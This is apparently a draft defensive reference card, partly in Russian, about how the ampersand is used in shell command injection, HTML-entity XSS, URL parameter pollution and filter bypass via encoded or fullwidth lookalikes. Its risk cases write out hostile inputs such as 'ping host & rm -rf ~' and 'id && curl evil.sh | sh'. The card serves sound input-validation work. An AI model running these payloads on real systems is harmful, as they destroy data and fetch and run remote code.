PRIVATE AUTHORED PROJECT / COMMERCIAL USE PROHIBITED

DOCUMENT_ID: SIGN_CORE_CARD_AMPERSAND_U0026_GEN3_v0_3_RU
DOCUMENT_TYPE: SIGN_CORE_CARD
TEMPLATE_LINE: GEN3_v0_3
DOCUMENT_STATUS: WORKING_DRAFT
STATUS: WORKING_DRAFT / NOT_LOCKED / NOT_RUNTIME / NOT_VALIDATOR / NOT_PRODUCTION / NOT_CONVEYOR_RUN
SOURCE_TEMPLATE: SIGN_CORE_CARD_TEMPLATE_GEN3_v0_3_EN
BASED_ON_RULESET: SIGN_CORE_CARD_CONVEYOR_RULES_GEN3_v0_3_EN
TRANSLATION_NOTE: Русский оригинал (authoritative). Английское зеркало — SIGN_CORE_CARD_AMPERSAND_U0026_GEN3_v0_3_EN. Кодпоинты, имена полей и формулы идентичны. ЧЕРНОВИК для нашей работы (Vakhter); конвейер — отдельный проект.

============================================================
0. UNIVERSALITY
============================================================
BOUND_TO_SPECIFIC_SIGN: YES
AFTER_USE_RESIDUE: FORBIDDEN
SIGN_DATA_IS_SESSION_ONLY: YES

============================================================
1. COMMON_CONVEYOR_DISCIPLINE
============================================================
CONVEYOR_DISCIPLINE_VERSION: v0_3
RUN_CARD_REQUIRED_BEFORE_LOCK: YES
LOCKED_WORKING_CORE_SELF_ASSIGNMENT: FORBIDDEN
MODEL_FAMILY_DIVERSITY_REQUIRED: YES
ADVERSARIAL_EVIDENCE_REQUIRED: YES
MUTATION_CHECK_REQUIRED: YES
LIMITATION_STATEMENT_REQUIRED: YES
AFTER_RUN_RESIDUE: FORBIDDEN
STATUS_PROGRESSION_TRACKER:
  WORKING_DRAFT: YES
  STRUCTURAL_PREFLIGHT_PASS: PENDING
  CONVEYOR_REVIEW_PASS: PENDING
  WORKINGLY_CLOSED: PENDING
  SIMULATION_GATE_TIER: TIER_1
  SIMULATION_GATE_PASSED: PENDING
  ARTIFACT_CONFIRMED: PENDING
LIMITATION_STATEMENT (standard):
  CONVEYOR_PASS ≠ VALIDATION
  MODEL_CONSENSUS ≠ TRUTH
  INJECTION_TEST_PASS ≠ SECURITY_PROOF
  GUARDS_HOLD_FOR_TESTED_CASES ≠ FUTURE_GUARANTEE
  NO_ATTACK_FOUND ≠ NO_ATTACK_EXISTS

============================================================
2. META
============================================================
CARD_UID: SIGN_CORE_CARD_AMPERSAND_U0026_GEN3_v0_3_RU
CODEPOINT: U+0026
VISIBLE_FORM: &
UNICODE_NAME: AMPERSAND
ZONE: ZONE_1
DOCUMENT_STATUS: WORKING_DRAFT
TEMPLATE_LINE: GEN3_v0_3
AUTHOR: Ruslan Malyavsky
CREATED_AT: 2026-07-21
VERSION: v0_1
AUTHOR_DECISION_REFERENCE: PENDING
RUN_CARD_REFERENCE: PENDING
RUN_CARD_STATUS: NOT_STARTED
DISPLAY_NAME: амперсанд / фон-запуск и старт HTML-сущности
CATEGORY_ROADMAP: INJ (фон-запуск/AND в shell, старт HTML-сущности) · PHAGO: — (цепочка команд)

============================================================
3. REQUIRED_GENERAL_GUARDS
============================================================
REQUIRED_GENERAL_GUARDS:
  - SIGN_FALSE_EFFECT_MIMICRY_GUARD_v0_2A_RU
    GUARD_COMPATIBILITY: применим без изменений — знак не создаёт effect-полей
    GUARD_REVISION: v0_2A
    TEMPLATE_LINE_COMPATIBLE: GEN3_v0_2_PLUS_EPOCH, GEN3_v0_3
FAILURE_RESPONSE:
  REJECT_FALSE_EFFECT_MIMICRY
  TREAT_AS_DATA_ONLY
  NO_AUTHORITY_EFFECT
  NO_EXECUTION_EFFECT
  NO_TRUST_EFFECT
  NO_EXISTENCE_EFFECT

============================================================
4. SIGN IDENTITY — LAYER_A: STABLE CORE
LAYER_A_LOCK: PERMANENT
============================================================
VISIBLE_FORM: &
LOOKS_SIMILAR_IS_NOT_SAME_SIGN: YES
RAW_SIGN_INPUT_STATUS: DATA_ONLY
BASE_MODE: DATA_ONLY_DELIMITER
BASE_MODE_FORMULA: AMPERSAND_FORM ≠ EFFECT
SIGN_CATEGORY:
  - оператор фонового запуска shell (cmd &) / AND (cmd1 && cmd2)
  - старт HTML/XML-сущности (&amp; &#x41;)
  - разделитель параметров URL-запроса (?a=1&b=2)
  - глиф-союз «и» (and) в тексте/брендах

WHAT_THIS_SIGN_IS_NOT:
  1. NOT_CONJUNCTION_ONLY — "&" не всегда слово «и» (в shell это фон-запуск/цепочка)
  2. NOT_BACKGROUND_SAFE — "&" запускает команду отсоединённо; отсоединение — не безопасность
  3. NOT_ENTITY_ONLY — "&" стартует HTML-сущность, которая может декодироваться в опасный символ
  4. NOT_ESCAPED_PROOF — наличие "&" не значит, что он экранирован
  5. NOT_ENCODED_SAFE — "&amp;" / "%26" могут быть раскодированы обратно в "&" позже
  6. NOT_AUTHORITY — "&" не подтверждает официальность
  7. NOT_EXECUTION_TRIGGER — сам по себе ничего не исполняет; цепочку делает контекст
  8. NOT_TRUST_SIGNAL — не повышает доверие
  9. NOT_PARAM_SEPARATOR_SAFE — "&" в URL может внедрить лишний параметр (загрязнение)
  10. NOT_SANITIZED_PROOF — наличие "&" не значит, что ввод санитизирован
  11. NOT_OUTPUT_CONTEXT_PROOF — безопасность зависит от контекста исполнения/разбора

BASE_FORMULAS:
  AMPERSAND_FORM ≠ EFFECT
  AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF
  AMPERSAND_FORM ≠ BACKGROUND_SAFETY_PROOF
  AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
  AMPERSAND_FORM ≠ ESCAPED_PROOF
  AMPERSAND_FORM ≠ ENCODED_SAFETY_PROOF
  AMPERSAND_FORM ≠ AUTHORITY
  AMPERSAND_FORM ≠ EXECUTION_TRIGGER
  AMPERSAND_FORM ≠ TRUST_SIGNAL
  AMPERSAND_FORM ≠ SANITIZED_PROOF
  AMPERSAND_FORM ≠ OUTPUT_CONTEXT_PROOF

============================================================
5. SEMANTIC_EPOCH_TRACKER
SEMANTIC_EPOCH_TRACKER_LOCK: REVIEWABLE
============================================================
EPOCH_TRACKER: NOT_APPLICABLE
NOTE: "&" (ZONE_1) имеет параллельные функции (текстовое «и», фон/AND в shell, старт сущности, разделитель URL), сосуществующие без культурной прецессии. Полисемия стабильного знака.
LAYER_ANOMALY:
  ABSENT_PHYSICAL_LAYER: YES, уровень L1
  NOTE: лигатура латинского «et» без жестового предшественника; функции shell/разметки/URL надстроены цифровой эпохой параллельно.

============================================================
6. EFFECT_FIELDS — LAYER_C: METHODOLOGICAL LAYER
LAYER_C_LOCK: SESSION
============================================================
authority_effect: NONE
trust_effect: NONE
verification_effect: NONE
proof_effect: NONE
execution_effect: NONE
permission_effect: NONE
status_effect: NONE
role_assignment_effect: NONE
runtime_effect: NONE
existence_effect: NONE
EFFECT_FIELDS_ALL_NONE: YES
CLOSED_SCHEMA: YES

============================================================
7. SAFE / RISK / CONFUSABLES / GUARDS — LAYER_B
LAYER_B_LOCK: REVIEWABLE
============================================================
SAFE_CASES:
  SAFE_CASE_001:
    INPUT: "Tom & Jerry"
    CONTEXT: «и» как союз в тексте
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF
  SAFE_CASE_002:
    INPUT: "Procter & Gamble"
    CONTEXT: амперсанд в названии бренда
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ EFFECT
  SAFE_CASE_003:
    INPUT: "?page=1&sort=asc"
    CONTEXT: обычный разделитель параметров URL
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ PARAM_SEPARATOR_SAFE
  SAFE_CASE_004:
    INPUT: "&amp;"
    CONTEXT: корректно кодированная HTML-сущность, показанная как текст
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
  SAFE_CASE_005:
    INPUT: "a && b"
    CONTEXT: логическое AND, показанное как текст
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ EFFECT
  SAFE_CASE_006:
    INPUT: "R&D department"
    CONTEXT: амперсанд внутри распространённого сокращения
    EXPECTED: INFO
    RISK: NONE
    GUARD: AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF

RISK_CASES:
  RISK_CASE_001:
    NAME: SHELL_BACKGROUND_INJECTION
    INPUT: "ping host & rm -rf ~"
    CONTEXT: фон-запуск одной команды и выполнение второй
    RISK: CRITICAL
    ATTACK: "&" отсоединяет первую команду и сразу запускает команду атакующего
    GUARD: AMPERSAND_FORM ≠ BACKGROUND_SAFETY_PROOF
  RISK_CASE_002:
    NAME: SHELL_AND_CHAIN
    INPUT: "id && curl evil.sh | sh"
    CONTEXT: условное AND-выполнение второй команды
    RISK: CRITICAL
    ATTACK: "&&" выполняет вторую команду, если первая успешна
    GUARD: AMPERSAND_FORM ≠ EFFECT
  RISK_CASE_003:
    NAME: HTML_ENTITY_XSS
    INPUT: "&#x6A;avascript:alert(1)"
    CONTEXT: числовая сущность, декодируемая в опасную строку
    RISK: HIGH
    ATTACK: "&#x6A;" декодируется в "j" → образует "javascript:" после проверки
    GUARD: AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
  RISK_CASE_004:
    NAME: PARAMETER_POLLUTION
    INPUT: "?role=user&role=admin"
    CONTEXT: загрязнение HTTP-параметров через дублирующий ключ
    RISK: HIGH
    ATTACK: "&" внедряет второй "role", который бэкенд может предпочесть (смена привилегий)
    GUARD: AMPERSAND_FORM ≠ PARAM_SEPARATOR_SAFE
  RISK_CASE_005:
    NAME: ENCODED_AMP_BYPASS
    INPUT: "cmd%26 rm -rf ~ (с поздним декодированием)"
    CONTEXT: кодированный "&" декодируется обратно перед исполнением
    RISK: HIGH
    ATTACK: %26 декодируется в "&" ПОСЛЕ проверки → фон-запуск/цепочка
    GUARD: AMPERSAND_FORM ≠ ENCODED_SAFETY_PROOF
  RISK_CASE_006:
    NAME: FULLWIDTH_AMP_BYPASS
    INPUT: "cmd＆rm (полноширинный ＆ U+FF06)"
    CONTEXT: похожий знак для обхода фильтра "&"
    RISK: MEDIUM
    ATTACK: фильтр ищет ASCII "&", нормализатор может свернуть ＆ в "&"
    GUARD: AMPERSAND_FORM ≠ EFFECT

CONFUSABLES:
  CONFUSABLE_001:
    VISIBLE_FORM: ＆
    CODEPOINT: U+FF06
    NAME: FULLWIDTH AMPERSAND
    RISK: HIGH
    RULE: FULLWIDTH_AMPERSAND ≠ AMPERSAND (обходит фильтр, ищущий ASCII "&")
  CONFUSABLE_002:
    VISIBLE_FORM: ﹠
    CODEPOINT: U+FE60
    NAME: SMALL AMPERSAND
    RISK: MEDIUM
    RULE: SMALL_AMPERSAND ≠ AMPERSAND
  CONFUSABLE_003:
    VISIBLE_FORM: ⅋
    CODEPOINT: U+214B
    NAME: TURNED AMPERSAND
    RISK: LOW
    RULE: TURNED_AMPERSAND ≠ AMPERSAND
  CONFUSABLE_004:
    VISIBLE_FORM: ⁊
    CODEPOINT: U+204A
    NAME: TIRONIAN SIGN ET
    RISK: LOW
    RULE: TIRONIAN_ET ≠ AMPERSAND (историческое сокращение «и», семантический двойник)
  CONFUSABLE_005:
    VISIBLE_FORM: 🙰
    CODEPOINT: U+1F670
    NAME: SCRIPT LIGATURE ET ORNAMENT
    RISK: LOW
    RULE: SCRIPT_ET_LIGATURE ≠ AMPERSAND (декоративная лигатура «et», общее происхождение)

CONTRADICTION_GUARDS:
  CG1:
    TRIGGER: "'&' — это всегда слово «и»"
    RESPONSE: AMPERSAND_FORM ≠ CONJUNCTION_ONLY_PROOF
    RULE: в shell "&" делает фон-запуск/цепочку команд
  CG2:
    TRIGGER: "фон-запуск команды безобиден"
    RESPONSE: AMPERSAND_FORM ≠ BACKGROUND_SAFETY_PROOF
    RULE: "&" запускает вторую команду отсоединённо
  CG3:
    TRIGGER: "'&' всегда стартует только безопасную HTML-сущность"
    RESPONSE: AMPERSAND_FORM ≠ ENTITY_ONLY_PROOF
    RULE: сущность может декодироваться в опасный символ (например, "j" в javascript:)
  CG4:
    TRIGGER: "'&amp;' / '%26' безопасен навсегда"
    RESPONSE: AMPERSAND_FORM ≠ ENCODED_SAFETY_PROOF
    RULE: кодированная форма может быть декодирована обратно в "&" перед исполнением
  CG5:
    TRIGGER: "фильтр по ASCII '&' ловит все амперсанды"
    RESPONSE: AMPERSAND_FORM ≠ EFFECT
    RULE: полноширинный ＆ (U+FF06) — другой кодпоинт
  CG6:
    TRIGGER: "наличие '&' значит, что ввод санитизирован"
    RESPONSE: AMPERSAND_FORM ≠ SANITIZED_PROOF
    RULE: наличие знака ничего не говорит о санитизации

SEQUENCE_LAYER_BOUNDARY:
  SIGN_SAFE_ALONE ≠ SIGN_SAFE_IN_SEQUENCE: YES
  SEQUENCE_CANDIDATES:
    SC1:
      SEQUENCE: "& "
      NAME: SHELL_BACKGROUND
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: фон-запуск и выполнение второй команды
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC2:
      SEQUENCE: "&&"
      NAME: SHELL_AND
      RISK_LEVEL: CRITICAL
      POSSIBLE_CONTEXTS: условное AND-выполнение второй команды
      REQUIRES_SEQUENCE_INTEGRATOR: YES
    SC3:
      SEQUENCE: "&#x"
      NAME: HEX_ENTITY
      RISK_LEVEL: HIGH
      POSSIBLE_CONTEXTS: числовая/hex HTML-сущность, декодируемая в опасный символ
      REQUIRES_SEQUENCE_INTEGRATOR: YES
  IF NOT_APPLICABLE: неприменимо — последовательности с "&" центральны для инъекции команд/сущностей.

PHAGO_ENTITY_MIMICRY:
  NOT_APPLICABLE:
    REASON: "&" делает фон-запуск/цепочку команд или стартует сущность, но не имитирует существование верифицированной сущности. Его риски — инъекция/декодирование, а не мимикрия сущности.
    REVIEW_REQUIRED: YES

============================================================
8. ADVERSARIAL_COVERAGE — RUN_CARD SEED
============================================================
MIN_TOTAL_VECTORS: 10 (5 категорий A-E, CATEGORY_F NOT_APPLICABLE для ZONE_1)
CATEGORY_A: FORM_MANIPULATION (2)
  A1: замена ASCII "&" на полноширинный ＆ (U+FF06) для обхода фильтра
  A2: замена на малый ﹠ (U+FE60)
CATEGORY_B: CONTEXT_INJECTION (2)
  B1: фон-запуск shell ping host & rm -rf ~
  B2: загрязнение HTTP-параметров ?role=user&role=admin
CATEGORY_C: SEQUENCE_MANIPULATION (2)
  C1: "&&" (SC2) — условное AND-выполнение
  C2: "&#x" (SC3) — декодирование hex-сущности
CATEGORY_D: SEMANTIC_MIMICRY (2)
  D1: "&" подан как безобидное «и» внутри поля команды
  D2: "&amp;" как «безопасный» кодированный текст с поздним декодированием
CATEGORY_E: PHAGO_ENTITY_MIMICRY (2)
  E1: N/A — знак не PHAGO-носитель; вектор: фон-цепочка в шаблон OS-команды
  E2: N/A — вектор: декодирование числовой сущности в опасную схему
CATEGORY_F: SEMANTIC_LAYER_MANIPULATION
  NOT_APPLICABLE
  REASON: ZONE_1, у знака нет спящих/активных эпох.
ACTUAL_TOTAL_VECTORS: 10
COVERAGE_STATUS: SUFFICIENT (10 ≥ 10)

============================================================
9. MUTATION_CHECK
============================================================
MUTATION_01:
  CLAIM: "&" — всегда слово «и»
  EXPECTED: FAIL_CONJUNCTION_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_02:
  CLAIM: фон-запуск команды безобиден
  EXPECTED: FAIL_BACKGROUND_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_03:
  CLAIM: "&" стартует только безопасную HTML-сущность
  EXPECTED: FAIL_ENTITY_ONLY_MIMICRY
  RESULT: FAIL
MUTATION_04:
  CLAIM: "&amp;" / "%26" безопасен навсегда
  EXPECTED: FAIL_ENCODED_SAFETY_MIMICRY
  RESULT: FAIL
MUTATION_05:
  CLAIM: фильтр по ASCII "&" ловит все похожие амперсанды
  EXPECTED: FAIL_CONFUSABLE_COVERAGE_MIMICRY
  RESULT: FAIL
MUTATION_06:
  CLAIM: наличие "&" доказывает санитизацию ввода
  EXPECTED: FAIL_SANITIZED_MIMICRY
  RESULT: FAIL

============================================================
10. KNOWN_OPEN_QUESTIONS
============================================================
OQ1:
  QUESTION: как нейтрализовать "&" по контексту (shell/HTML-сущность/URL) без ложных срабатываний на тексте/брендах/строках запроса?
  STATUS: CLOSED_AS_DELEGATED_TO_INTEGRATOR (exec через вектор аргументов + декодирование-затем-валидация сущностей + строгий разбор параметров — забота интегратора/рантайма)
  BLOCKS_WORKINGLY_CLOSED: NO
  NOTE: карточка фиксирует правило «безопасность '&' решается контекстом исполнения/разбора».
ALL_OPEN_QUESTIONS_CLOSED: NO (делегировано, не блокирует)

============================================================
11. PATCH_HISTORY
============================================================
PATCH_HISTORY:
  v0_1_PATCH_01: первичное создание (Ruslan Malyavsky, 2026-07-21) — черновик по шаблону GEN3_v0_3 (Vakhter); не прогнан по конвейеру.
PATCHES_APPLIED: 1
PATCHES_VERIFIED: 0/1

============================================================
12. LIMITATION_STATEMENT
============================================================
LIMITATION_STATEMENT:
  THIS_CARD IS A WORKING_DRAFT ARTIFACT (until ARTIFACT_CONFIRMED)
  NOT A FINAL_STANDARD
  NOT A PARSER
  NOT A RUNTIME
  NOT A SECURITY_CERTIFICATE
  NOT_CONVEYOR_RUN (черновик для нашей работы; конвейер — отдельный проект)
  CONVEYOR_PASS ≠ VALIDATION
  RUN_CARD_RESULT ≠ FINAL_STATUS
  WORKINGLY_CLOSED ≠ ARTIFACT_CONFIRMED

============================================================
13. INTEGRATION_INTERFACE_STATUS
============================================================
INTEGRATION_INTERFACE_STATUS:
  STATUS: READY_PENDING_CONCRETE_INTEGRATOR
  ATTACHED_INTEGRATOR_UID: NONE_CURRENTLY_ATTACHED
  ACTIVE_MODULES_COUNT: 0
  RUNTIME_ATTACHMENT: NONE
  PERMANENT_BINDING: NO
  SESSION_ONLY_BINDING: YES
  AFTER_RUN_RESIDUE: FORBIDDEN

============================================================
END_OF_DOCUMENT
